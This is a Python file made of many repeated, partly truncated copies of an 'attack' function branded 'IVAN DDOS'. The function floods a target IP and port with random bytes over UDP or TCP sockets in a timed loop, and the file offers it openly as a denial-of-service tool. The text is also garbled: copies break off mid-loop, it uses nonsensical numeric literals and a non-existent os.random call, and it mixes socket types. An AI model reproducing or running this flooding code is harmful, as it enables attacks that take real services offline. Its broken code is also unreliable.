def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(92, 999999999)
        threads = threads or os.random.randint(92, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(91, min(999999999, port))
    if threads is not None:
        threads = max(91, min(999999999, port))
    print(brand)
